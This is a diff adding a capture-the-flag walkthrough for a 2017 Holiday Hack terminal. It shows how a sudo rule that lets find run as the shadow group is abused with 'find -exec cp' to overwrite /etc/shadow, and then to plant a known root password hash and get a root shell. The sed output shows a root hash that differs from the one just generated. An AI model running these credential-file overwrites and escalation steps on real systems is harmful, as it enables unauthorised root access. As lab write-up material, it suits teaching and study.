@@ -38,99 +38,208 @@
    :CUSTOM_ID: how-to-find-the-terminal
    :END:
 
-Where was the terminal? What's the direct link to it?
+Where was the terminal?
+
+https://docker2017.holidayhackchallenge.com/?challenge=a9d07a00-55bc-4391-a02b-71f3c4f1ec44&uid=USER_ID
 
 ** Background Information
    :PROPERTIES:
    :CUSTOM_ID: background-information
    :END:
 
-Do we know anything about this terminal already?
+We're logged in as the user =elf=. We happen to know that
+=/etc/shadow= is where *NIX systems store the password hashes for
+their users.
 
-Hints:
+The system MOTD gives us a hint:
 
-List any useful hints here.
-
-Blog Posts:
-
-Are any of these useful?
-
-- Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
-  (EC2)
-  https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2
-  Spinning up an EC2 instance, but also a lot of emphasis on how to use
-  SSH keys.
-- Your Pokemon Guide for Essential SQL Pen Test Commands
-  https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands
-  SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
-- Exploiting XXE Vulnerabilities in IIS/.NET
-  https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities
-  Including remote content in XML
-- Why You Need the Skills to Tinker with Publicly Released Exploit Code
-  https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code
-  Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
-  CVE-2017-9805 Code: https://github.com/chrisjd20/cve-2017-9805.py
-- Go To The Head Of The Class: LD\_PRELOAD For The Win
-  https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win
-- A Spot of Tee
-  https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee Restricted
-  bash shell, and bypassing the I/O restriction with tee
-- Understanding and Exploiting Web-based LDAP
-  https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap
-  LDAP syntax, LDAP injection
-- Massively Scaling your Scanning
-  https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning
-  masscan
+#+BEGIN_QUOTE
+What commands can you run with sudo?
+#+END_QUOTE
 
 ** Goal
    :PROPERTIES:
    :CUSTOM_ID: goal
    :END:
 
-What are we trying to accomplish?
+We need to overwrite /etc/shadow with /etc/shadow.bak. Basically we
+need to ~cp /etc/shadow.bak /etc/shadow~, except that we don't have
+permissions to do that.
 
 ** Approach
    :PROPERTIES:
    :CUSTOM_ID: approach
    :END:
 
-Describe the thought process that we tried here. How were we able to use
-the hints or the blog posts?
+If we follow the hint, we should try to figure out what commands we can run with sudo. Let's run ~sudo -h~ to view the help documentation:
+
+#+BEGIN_EXAMPLE
+sudo - execute a command as another user
+...
+  -l, --list                  list user's privileges or check a specific command; use twice for longer format
+...
+#+END_EXAMPLE
+
+To follow the hint, we should run sudo with the ~--list~ option, to see what our privileges are:
+
+#+BEGIN_SRC sh
+elf@40a64f5e12a2:~$ sudo --list
+Matching Defaults entries for elf on 40a64f5e12a2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User elf may run the following commands on 40a64f5e12a2:
+    (elf : shadow) NOPASSWD: /usr/bin/find
+#+END_SRC
+
+We can run the find command, but it also mentions something about shadow. Let's give it a shot:
+
+#+BEGIN_SRC sh
+elf@2100915cb450:~$ sudo find
+[sudo] password for elf: 
+#+END_SRC
+
+We don't know the password. The sudo output said we should be able to
+run this without a password ("NOPASSWD"). Something's not quite
+right. We can run sudo with ~-l -l~ as the help output said to get
+some more verbose output:
+
+#+BEGIN_SRC sh
+elf@2100915cb450:~$ sudo -l -l
+Matching Defaults entries for elf on 2100915cb450:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User elf may run the following commands on 2100915cb450:
+Sudoers entry:
+    RunAsUsers: elf
+    RunAsGroups: shadow
+    Options: !authenticate
+    Commands:
+        /usr/bin/find
+#+END_SRC
+
+Ok. So sudo lets us run the find command as the user elf, and the group shadow. Viewing ~sudo -h~ one more time shows us that there's an option we want to set our group to =shadow=:
+#+BEGIN_EXAMPLE
+  -g, --group=group           run command as the specified group name or ID
+#+END_EXAMPLE
+
+#+BEGIN_SRC sh
+elf@2100915cb450:~$ sudo -g shadow find 
+.
+./.bashrc
+./.bash_logout
+./.profile
+#+END_SRC
+
+This time, sudo let us run find without prompting us for a
+password. So, we know that we can run commands as the elf user, and
+the shadow group. Is this enough to overwrite =/etc/shadow=?
+
+#+BEGIN_SRC sh
+elf@2100915cb450:~$ ls -l /etc/shadow
+-rw-rw---- 1 root shadow 0 Dec 15 20:00 /etc/shadow
+#+END_SRC
+
+Yes. =/etc/shadow= is owned by the root user and the shadow group, and
+the group has write permissions to it. At this point, the only thing
+that's left is figuring out how to use =find= in order to copy
+=/etc/shadow.bak= to =/etc/shadow=. =find= has an exec option:
+
+#+BEGIN_EXAMPLE
+actions: -delete -print0 -printf FORMAT -fprintf FILE FORMAT -print 
+      -fprint0 FILE -fprint FILE -ls -fls FILE -prune -quit
+      -exec COMMAND ; -exec COMMAND {} + -ok COMMAND ;
+      -execdir COMMAND ; -execdir COMMAND {} + -okdir COMMAND ;
+#+END_EXAMPLE
+
+Let's give it a shot:
+#+BEGIN_SRC sh
+elf@2100915cb450:~$ sudo -g shadow find -exec cp /etc/shadow.bak /etc/shadow \;
+#+END_SRC
+
+Looks like that worked:
+
+#+BEGIN_SRC sh
+elf@2100915cb450:~$ inspect_da_box 
+                     ___
+                    / __'.     .-"""-.
+              .-""-| |  '.'.  / .---. \
+             / .--. \ \___\ \/ /____| |
+            / /    \ `-.-;-(`_)_____.-'._
+           ; ;      `.-" "-:_,(o:==..`-. '.         .-"-,
+           | |      /       \ /      `\ `. \       / .-. \
+           \ \     |         Y    __...\  \ \     / /   \/
+     /\     | |    | .--""--.| .-'      \  '.`---' /
+     \ \   / /     |`        \'   _...--.;   '---'`
+      \ '-' / jgs  /_..---.._ \ .'\\_     `.
+       `--'`      .'    (_)  `'/   (_)     /
+                  `._       _.'|         .'
+                     ```````    '-...--'`
+/etc/shadow has been successfully restored!
+#+END_SRC
 
 ** Solution
    :PROPERTIES:
    :CUSTOM_ID: solution
    :END:
 
-Summarize the reference solution that we found.
+A one-liner is:
+
+#+BEGIN_SRC sh
+sudo -g shadow find -exec cp /etc/shadow.bak /etc/shadow \; && inspect_da_box
+#+END_SRC
 
 AsciiCinema video of the solution?
-
-** Alternatives
-   :PROPERTIES:
-   :CUSTOM_ID: alternatives
-   :END:
-
-Any other, easier solutions?
 
 ** Common Pitfalls
    :PROPERTIES:
    :CUSTOM_ID: common-pitfalls
    :END:
 
-Do we know what issue(s) people were running into?
+=find='s exec syntax is a little weird, and a common mistake is forgetting to escape the semicolon at the end:
 
-** About the Challenge
-   :PROPERTIES:
-   :CUSTOM_ID: about-the-challenge
-   :END:
+#+BEGIN_SRC sh
+elf@2100915cb450:~$ sudo -g shadow find -exec cp /etc/shadow.bak /etc/shadow ;
+find: missing argument to `-exec'
+#+END_SRC
 
-How was the challenge setup? Was there a better way to secure this
-system?
+Another issue is just the fact that sudo is often set up for user
+permissions, and not group permissions, so the =-g= flag is less well
+known.
 
-** Loot
-   :PROPERTIES:
-   :CUSTOM_ID: loot
-   :END:
+** Going Further - Privilege Escalation
 
-Anything interesting hidden on the system?
+This is neat, but let's elevate privileges to root on this
+terminal. Our approach will be to put in a modified shadow file
+instead, which will have a password we know for the root user.
+
+First, let's generate the password hash in the right format:
+
+#+BEGIN_SRC sh
+elf@2100915cb450:~$ echo "password" | openssl passwd -1 -stdin
+$1$wDLzsvsW$0.aZ24yCO8xhhjnfHUIG3/
+#+END_SRC
+
+Now that we have a hash, we'll use sed to modify the =/etc/shadow.bak=
+file to have that for root's password. Remember to be careful in
+escaping special characters in the sed command line.
+
+#+BEGIN_SRC sh
+elf@2100915cb450:~$ sed -e 's/root:\*/root:$1$wDLzsvsW$0.aZ24yCO8xhhjnfHUIG3/' /etc/shadow.bak | tee better.shadow
+root:$1$WPvxfOOK$JqDBD/DPQlpkUBOC3qTp51:17484:0:99999:7:::
+daemon:*:17484:0:99999:7:::
+bin:*:17484:0:99999:7:::
+sys:*:17484:0:99999:7:::
+sync:*:17484:0:99999:7:::
+games:*:17484:0:99999:7:::
+...
+#+END_SRC
+
+Now, we re-run our find command, and find that we can escalate to root with a password of ~password~:
+
+#+BEGIN_SRC sh
+elf@2100915cb450:~$ sudo -g shadow find -exec cp better.shadow /etc/shadow \;
+elf@2100915cb450:~$ su
+Password: 
+root@2100915cb450:/home/elf# id  
+uid=0(root) gid=0(root) groups=0(root)
+#+END_SRC
